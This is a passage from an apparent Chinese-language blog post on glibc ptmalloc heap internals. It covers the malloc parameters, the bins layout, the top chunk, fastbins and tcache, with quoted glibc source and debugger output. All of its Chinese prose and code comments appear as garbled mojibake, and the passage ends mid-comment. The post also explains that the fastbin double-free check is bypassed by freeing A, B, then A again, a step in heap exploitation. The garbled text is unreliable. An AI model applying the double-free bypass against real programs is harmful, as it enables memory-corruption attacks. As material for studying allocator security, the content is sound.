<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">    &#123;</span><br><span class="line">        .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">        .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">        .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">        .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof(long) == 4 ? 2 : 8))</span></span><br><span class="line">        .arena_test = NARENAS_FROM_NCORES(<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">            ,</span><br><span class="line">        .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">        .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">        .tcache_max_bytes = tidx2usize(TCACHE_MAX_BINS - <span class="number">1</span>),</span><br><span class="line">        .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x mp_</span><br><span class="line"><span class="variable">$15</span> = &#123;</span><br><span class="line">  trim_threshold = 0x20000,</span><br><span class="line">  top_pad = 0x20000,</span><br><span class="line">  mmap_threshold = 0x20000,</span><br><span class="line">  arena_test = 0x8,</span><br><span class="line">  arena_max = 0x0,</span><br><span class="line">  thp_pagesize = 0x0,</span><br><span class="line">  hp_pagesize = 0x0,</span><br><span class="line">  hp_flags = 0x0,</span><br><span class="line">  n_mmaps = 0x0,</span><br><span class="line">  n_mmaps_max = 0x10000,</span><br><span class="line">  max_n_mmaps = 0x0,</span><br><span class="line">  no_dyn_threshold = 0x0,</span><br><span class="line">  mmapped_mem = 0x0,</span><br><span class="line">  max_mmapped_mem = 0x0,</span><br><span class="line">  sbrk_base = 0x0,</span><br><span class="line">  tcache_bins = 0x40,				//tcacheæœ‰0x40ä¸ªæ¡¶å­</span><br><span class="line">  tcache_max_bytes = 0x408,			//tcacheä¸­æœ€å¤§èƒ½æ”¾çš„å †å—å¤§å°</span><br><span class="line">  tcache_count = 0x7,				//ä¸€ä¸ªtcacheæ¡¶å­ä¸­æœ€å¤šæ”¾7å—</span><br><span class="line">  tcache_unsorted_limit = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="æ–Œs"><a href="#æ–Œs" class="headerlink" title="æ–Œs"></a>æ–Œs</h2><p><strong>unsortedbin,smallbins,largebins</strong>å®é™…ä¸Šä½äºåŒä¸€ä¸ªæ•°ç»„çš„ä¸åŒä¸‹æ ‡ä½ç½®</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];				<span class="comment">//unsortedbin &amp; smallbins &amp; largebins</span></span><br><span class="line">								<span class="comment">//NBINS = 128</span></span><br><span class="line">								<span class="comment">//bins[254]</span></span><br></pre></td></tr></table></figure>

<p><code>bins</code>å…±æœ‰<code>254</code>ä¸ªå…ƒç´ ,ä½†æ˜¯å®é™…ä¸Šæ˜¯<code>127</code>ä¸ªæ¡¶å­å¤´,æ¯ä¸ªæ¡¶å­å¤´å ç”¨ç›¸é‚»çš„ä¸¤ä¸ª<code>bins</code>å…ƒç´ </p>
<p>è¿™ä¸ªæ¡¶å­å¤´æŒºå¥‡è‘©çš„,åä¹‰ä¸Šæ¡¶å­å¤´æ˜¯ä¸€ä¸ª<code>malloc_chunk</code>,ç„¶è€Œå®é™…ä¸Šä¸€ä¸ªæ¡¶å­å¤´åªæœ‰<code>fd</code>å’Œ<code>bk</code>ä¸¤ä¸ªæŒ‡é’ˆæœ‰æ•ˆ,å…¶ä»–éƒ¨åˆ†å’Œå‰ä¸€ä¸ªæ¡¶å­å¤´é‡å </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))			      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026183930533.png" alt="bin_at"></p>
<p>å¯ä»¥çœ‹åˆ°<code>bins[0]</code>æ—¢å¤„äº<code>bin_at(M,1)-&gt;fd</code>çš„ä½ç½®,åˆå¤„äº<code>bin_at(M,2)-&gt;prev_size</code>çš„ä½ç½®</p>
<p>è€Œå®é™…ä¸Šæ¡¶å­å¤´å¹¶ä¸éœ€è¦<code>prev_size</code>å’Œ<code>size</code>è¿™ä¸¤ä¸ªå±æ€§,åªéœ€è¦å‰é©±åç»§æŒ‡é’ˆå°±å¯ä»¥äº†</p>
<p><strong>å› æ­¤<code>bins[0]</code>æ‰®æ¼”<code>bin_at(M,1)-&gt;fd</code>çš„è§’è‰²</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bin_at(M,0)								//æ— æ•ˆ</span><br><span class="line">bin_at(M,1) =&gt; unsorted bin				//1ä¸ª</span><br><span class="line">bin_at(M,2~63) =&gt; small bins			//</span><br><span class="line">bin_at(M,64~126) =&gt; large bins</span><br></pre></td></tr></table></figure>



<p><strong>fastbins</strong>æ¯”è¾ƒç‰¹æ®Š,æ˜¯ä¸Šè¿°ä¸‰ç§<code>bins</code>çš„ç¼“å­˜å™¨,è‡ªå·±ä½¿ç”¨ä¸€ä¸ªæ•°ç»„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br></pre></td></tr></table></figure>





<h3 id="Topchunk"><a href="#Topchunk" class="headerlink" title="Topchunk"></a>Topchunk</h3><p><code>topchunk</code>æ˜¯æ‚è´§å¸‚åœº</p>
<p>æœ€åˆæ–Œå®¶ä¸€ç©·äºŒç™½, ç”¨æˆ·ä»<strong>å¤´å—æ‚è´§å¸‚åœº</strong>ç›´æ¥æ‹¿è´§, ç”¨å®Œäº†é‡Šæ”¾çš„æ—¶å€™, æ–Œå®¶çš„ä¹±æ–Œæ¥æ‹¾ç ´çƒ‚å„¿, ç„¶åæ‹¿å›å®¶å’Œå¤§æ–Œå°æ–Œåˆ†èµƒ</p>
<p>æ­¤åç”¨æˆ·ä¼˜å…ˆä»æ–Œå®¶æ‹¿è´§, æ–Œå®¶æ²¡è´§æ‰ä¼šå»<strong>å¤´å—æ‚è´§å¸‚åœº</strong>æ‹¿è´§</p>
<h4 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h4><p>å¦‚æœå„ä¸ª<code>bin</code>éƒ½æ²¡èƒ½æ»¡è¶³åˆ†é…è¯·æ±‚,é‚£ä¹ˆåªèƒ½è¯·<code>topchunk</code>å‡ºå±±</p>
<p>è¿™æ˜¯<code>ptmalloc</code>å †ç®¡ç†å™¨èƒ½å¤Ÿæ‹¿å‡ºçš„æœ€å¤§å†…å­˜å—äº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241031150833167.png" alt="image-20241031150833167"></p>
<h3 id="å¿«æ–ŒFastbins"><a href="#å¿«æ–ŒFastbins" class="headerlink" title="å¿«æ–ŒFastbins"></a>å¿«æ–ŒFastbins</h3><h4 id="datastructure"><a href="#datastructure" class="headerlink" title="datastructure"></a>datastructure</h4><p><code>fastbins</code>å®é™…ä¸Šæ˜¯ä¸€ç»„å•é“¾è¡¨, è¯¥å•é“¾è¡¨çš„æ‰€æœ‰é™„åŠ å¤´èŠ‚ç‚¹ä½äºåˆ—è¡¨<code>fastbins</code>åˆ—è¡¨ä¸­</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026103730227.png" alt="image-20241026103730227"></p>
<p><code>fastbins</code>ä¸­å…±æœ‰<code>10</code>ä¸ªå•é“¾è¡¨</p>
<p>æ˜¾ç„¶æ¯ä¸ªå•é“¾è¡¨ä¸­å­˜æ”¾å¤§å°ç›¸åŒçš„å †å—,å…·ä½“æ¥è¯´,å †å—å¤§å°åˆ°ä¸‹æ ‡çš„æ˜ å°„ä¸º:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index(sz) </span><br><span class="line">	= ((((<span class="type">unsigned</span> <span class="type">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line">	= ( sz &gt;&gt; <span class="number">4</span> ) - <span class="number">2</span> </span><br><span class="line">        </span><br><span class="line"> </span><br><span class="line">#MAX_FAST_SIZE     </span><br><span class="line">	= (<span class="number">80</span> * SIZE_SZ / <span class="number">4</span>)</span><br><span class="line">    = <span class="number">160</span></span><br><span class="line"></span><br><span class="line">NFASTBINS  </span><br><span class="line">    = (fastbin_index (request2size (MAX_FAST_SIZE)) + <span class="number">1</span>)</span><br><span class="line">    = fastbin_index(<span class="number">0xb0</span>) + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xb0</span> / <span class="number">0x10</span> - <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xb</span> - <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">    = <span class="number">0xa</span></span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th>fastbins idx</th>
<th>mem_size</th>
<th>chunk_size</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x10</td>
<td>0x20</td>
</tr>
<tr>
<td>1</td>
<td>0x20</td>
<td>0x30</td>
</tr>
<tr>
<td>2</td>
<td>0x30</td>
<td>0x40</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>6</td>
<td></td>
<td>0x80</td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>9</td>
<td>0xa0</td>
<td>0xb0</td>
</tr>
</tbody></table>
<blockquote>
<p>ç„¶è€Œå®é™…ä¸Šåªèƒ½ç”¨åˆ°å‰<code>7</code>ä¸ª,ä¹Ÿå°±æ˜¯<code>[0:6]</code>è¿™<code>7</code>ä¸ªæ¡¶,è¿™æ˜¯åˆ†é…åŒºåˆå§‹åŒ–æ—¶ä¼šé™åˆ¶æœ€å¤§<code>fastbins</code>å †å—å¤§å°ä¸º<code>0x80</code>(åŒ…å«å…ƒæ•°æ®)</p>
<p>ç„¶ååœ¨<code>_int_free</code>å‡½æ•°ä¸­ä¼šæ£€æŸ¥å½“å‰å †å—å¤§å°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())&#123;</span><br><span class="line">    <span class="comment">//å°è¯•ä½¿ç”¨fastbin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå½“å‰å †å—å¤§å°å¤§äº<code>0x80</code>åˆ™ä¸ä¼šé€šè¿‡è¯¥æ£€æŸ¥,ä¹Ÿå°±ä¸ä¼šå¾€<code>fastbins</code>ä¸­å¡</p>
<p>å¦‚æœè°ƒç”¨<code>set_max_fast(s)</code>é‡æ–°è®¾ç½®<code>global_max_fast</code>å€¼,ä½¿å…¶å¤§äº<code>MAX_FAST_SIZE</code>,ä¹Ÿæ˜¯ä¸å¯ä»¥çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> set_max_fast(s) \</span></span><br><span class="line"><span class="meta">  global_max_fast = (((size_t) (s) &lt;= MALLOC_ALIGN_MASK - SIZE_SZ)	\</span></span><br><span class="line"><span class="meta">                     ? MIN_CHUNK_SIZE / 2 : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="title function_">INTERNAL_SIZE_T</span></span><br><span class="line"> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Tell the GCC optimizers that global_max_fast is never larger</span></span><br><span class="line"><span class="comment">     than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span></span><br><span class="line"><span class="comment">     _int_malloc after constant propagation of the size parameter.</span></span><br><span class="line"><span class="comment">     (The code never executes because malloc preserves the</span></span><br><span class="line"><span class="comment">     global_max_fast invariant, but the optimizers may not recognize</span></span><br><span class="line"><span class="comment">     this.)  */</span></span><br><span class="line">  <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">    __builtin_unreachable ();</span><br><span class="line">  <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥<code>__builtin_unreachable</code></p>
</blockquote>
<h4 id="algorithm-1"><a href="#algorithm-1" class="headerlink" title="algorithm"></a>algorithm</h4><p>å¿«æ–Œå¯èƒ½å»è¿™å‡ ä¸ªåœ°æ–¹è¿›è´§:</p>
<p>1.<code>free</code>æ—¶<code>tcache</code>æœªå¯ç”¨æˆ–è€…å·²ç»å……æ»¡,å¹¶ä¸”å †å—ä¸æ˜¯<code>mmap</code>å †å—,å¹¶ä¸”å¤§å°åœ¨å¿«æ–Œç®¡ç†èŒƒå›´å†…,å¹¶ä¸”å¿«æ–Œç¼ºè´§, é‚£ä¹ˆå¿«æ–Œä¼šç•™ä¸‹è¿™å—</p>
<h5 id="free"><a href="#free" class="headerlink" title="free"></a>free</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241021102154730.png" alt="free beyond tcache"></p>
<p>å½“å¯¹åº”å †å—å¤§å°çš„<code>tcache</code>è¢«å¡«å……æ»¡ä¹‹å,å¦‚æœè¿˜æœ‰ç›¸åŒå¤§å°çš„å †å—é‡Šæ”¾,ä¼šå…ˆå°è¯•æ”¾åˆ°<code>fastbins</code>ä¸­</p>
<p>åœ¨<code>x64</code>ä¸Š,é»˜è®¤æƒ…å†µä¸‹,å°äº<code>0x80</code>(åŒ…å«å…ƒæ•°æ®)çš„å †å—,æ‰ä¼šè¢«å¡åˆ°<code>fastbins</code>ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_int_malloc.c</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);								<span class="comment">//sizeæ¢ç®—æ¡¶ä¸‹æ ‡</span></span><br><span class="line">fb = &amp;fastbin(av, idx);												<span class="comment">//æ¡¶å­å¤´èŠ‚ç‚¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">mchunkptr old = *fb, old2;											<span class="comment">//*fbæ˜¯æ¡¶å­å¤´åŸæ¥æŒ‡å‘çš„ç¬¬ä¸€ä¸ªchunk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P)			<span class="comment">//å¦‚æœå½“å‰è¿›ç¨‹åªæœ‰ä¸€ä¸ªçº¿ç¨‹,é‚£ä¹ˆæ˜¾ç„¶åªä¼šä½¿ç”¨åˆ°main_arena,ä¸ä¼šæœ‰å…¶ä»–åˆ†é…åŒº</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">       add (i.e., double free).  */</span>									<span class="comment">//å”æ°ä¸€æ ·çš„DFåˆ¤æ–­</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))								<span class="comment">//å½“å‰é‡Šæ”¾çš„pæ˜¯å¦å’Œä¸Šæ¬¡é‡Šæ”¾æ˜¯åŒä¸€å—</span></span><br><span class="line">        malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);								<span class="comment">//å¤´æ’æ³•ä¸Šé“¾,åç»§æŒ‡é’ˆä¹Ÿä½¿ç”¨SafeLinking</span></span><br><span class="line">    *fb = p;														<span class="comment">//æ¡¶å­å¤´åˆ°å †å—çš„æŒ‡é’ˆæ˜¯è£¸çš„</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">           add (i.e., double free).  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">        old2 = old;</span><br><span class="line">        p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);</span><br><span class="line">    &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªéå¸¸å”æ°çš„äºŒæ¬¡é‡Šæ”¾æ£€æŸ¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))								</span><br><span class="line">    malloc_printerr(<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>æ„æ€å°±æ˜¯æœ¬æ¬¡é‡Šæ”¾çš„å †å—å’Œæ¡¶å­é‡Œæœ€åä¸€æ¬¡é‡Šæ”¾çš„å †å—ä¸èƒ½æ˜¯ä¸€ä¸ª</p>
<p>é‚£å…ˆ<code>free(A)</code>ç„¶å<code>free(B)</code>ç„¶å<code>free(A)</code>,å°±é¥¶è¿‡äº†</p>
</blockquote>
<p><strong>æ³¨æ„åˆ°è¿”è¿˜ç»™fastbinsçš„å †å—,ä¸ä¼šæ¶ˆé™¤ä¸‹ä¸€å †å—P(Prev in use)æ ‡å¿—,è¿™å°±å¯¼è‡´å †å—åˆå¹¶æ—¶ä¸ä¼šç‰µæ‰¯åˆ°fastbinsä¸­çš„å †å—</strong></p>
<h5 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png" alt="malloc beyond tcache"></p>
<p>ä¸€æ¬¡<code>malloc</code>è¯·æ±‚,å¯èƒ½å‘ç”Ÿä¸¤ä»¶äº‹:</p>
<p>1.å¦‚æœ<code>fastbin</code>å¯¹åº”æ¡¶å­ä¸­æœ‰ç©ºé—²å †å—,æŠŠ<code>fastbin</code>ä¸­ç›¸åº”æ¡¶å­ä¸­çš„<strong>å¤´å—</strong>è¿”å›</p>
<p>2.å¦‚æœ<code>tcache</code>å¯¹åº”æ¡¶å­æœ‰ç©º,å†æŠŠ<code>fastbin</code>ä¸­å‰©ä¸‹çš„ç›¸åº”å¤§å°çš„å †å—å¡æ»¡<code>tcache</code>å¯¹åº”çš„æ¡¶å­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast()))</span><br><span class="line">&#123;</span><br><span class="line">    idx = fastbin_index(nb);                                            <span class="comment">//å¤§å°æ¢ç®—ä¸‹æ ‡</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);                                <span class="comment">//æ¡¶å­å¤´</span></span><br><span class="line">    mchunkptr pp;                                               </span><br><span class="line">    victim = *fb;                                                       <span class="comment">//æ¡¶é‡Œçš„ç¬¬ä¸€å—</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)                                                 <span class="comment">//å¦‚æœæ¡¶é‡Œä¸€å—éƒ½æ²¡æœ‰,å°±åˆ«åœ¨fastbinsä¸­åºŸè¯äº†,æ»šè›‹å°±å®Œäº†</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(victim)))                 <span class="comment">//å¯¹é½æ£€æŸ¥</span></span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)                                            <span class="comment">//å¦‚æœæ˜¯å•çº¿ç¨‹åˆ™å°†å¤´å—æ‹†ä¸‹æ¥, æ¬¡å—æˆä¸ºå¤´å—</span></span><br><span class="line">            *fb = REVEAL_PTR(victim-&gt;fd);</span><br><span class="line">        <span class="keyword">else</span>                                                            <span class="comment">//å¦‚æœæ˜¯å¤šçº¿ç¨‹, åˆ™è°ƒç”¨REMOVE_FBå®å°†å¤´å—æ‹†ä¸‹æ¥</span></span><br><span class="line">            REMOVE_FB(fb, pp, victim);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_likely(victim != <span class="literal">NULL</span>))                             <span class="comment">//æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥å°±æ‹¿åˆ°äº†ä¸€å—</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">size_t</span> victim_idx = fastbin_index(chunksize(victim));       <span class="comment">//å†æ£€æŸ¥ä¸€ä¸‹æ‹¿åˆ°çš„è¿™å—å¤§å°æ˜¯å¦åˆæ ¼</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="number">0</span>))					<span class="comment">//æ£€æ ¡ä¸€ä¸‹è¿™ä¸ªå †å—æ˜¯ä¸æ˜¯æ’ç­ç”Ÿ</span></span><br><span class="line">                malloc_printerr(<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">            check_remalloced_chunk(av, victim, nb);</span><br><span class="line">           ...</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//////////////////////////////////////</span></span><br><span class="line">      <span class="comment">////////////å°è¯•ç¼“å­˜è‡³tcache////////////</span></span><br><span class="line">      <span class="comment">//////////////////////////////////////        </span></span><br><span class="line">               </span><br><span class="line">      <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">      alloc_perturb(p, bytes);											<span class="comment">//å †å—åœ¨ç»™ç”¨æˆ·ä½¿ç”¨ä¹‹å‰,æŠŠå…¶ä¸­çš„æ•°æ®å…¨éƒ½æ“¦é™¤,é˜²æ­¢ä¿¡æ¯æ³„éœ²</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šå¦‚æœç¼–è¯‘æ—¶å¼€å¯äº†<code>USE_TCACHE</code>é€‰é¡¹(é»˜è®¤æ˜¯å¼€å¯çš„),</p>
<p>åœ¨æœ¬æ¬¡åˆ†é…è¯·æ±‚æ‹¿åˆ°å †å—ä¹‹å,åœ¨è¿”å›ä¹‹å‰,è¿˜ä¼šå…ˆå°è¯•æŠŠ<code>fastbin</code>ä¸­çš„å‰©ä½™çš„åŒæ ·å¤§å°çš„å †å—ç¼“å­˜åˆ°<code>tcache</code>ä¸­,ç›´åˆ°<code>tcache</code>å¡æ»¡æˆ–è€…<code>fastbin</code>ç©º</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE                              <span class="comment">//å¦‚æœä½¿ç”¨tcache, ä¸‹é¢è¦æŠŠfastbinä¸­çš„å †å—å°è¯•ç¼“å­˜è¿›å…¥tcache,ä¸ºä¸‹ä¸€æ¬¡åˆ†é…åŠ é€Ÿ</span></span></span><br><span class="line">            <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">           stash them in the tcache.  */</span></span><br><span class="line">            <span class="type">size_t</span> tc_idx = csize2tidx(nb);                             <span class="comment">//è®¡ç®—nbå¤§å°çš„å †å—,åœ¨tcacheä¸­çš„ä¸‹æ ‡</span></span><br><span class="line">            <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)                     <span class="comment">//åˆ¤æ–­æ˜¯å¦åœ¨tcacheèŒƒå›´ä¸­</span></span><br><span class="line">            &#123;</span><br><span class="line">                mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">                <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)<span class="comment">//æ£€æŸ¥tcacheå¯¹åº”æ¡¶æ˜¯å¦æœ‰ç©ºé—´</span></span><br><span class="line">                &#123;<span class="comment">//whileç»ˆæ­¢çš„æ¡ä»¶,è¦ä¹ˆæ˜¯tcacheè¢«ç‹ ç‹ 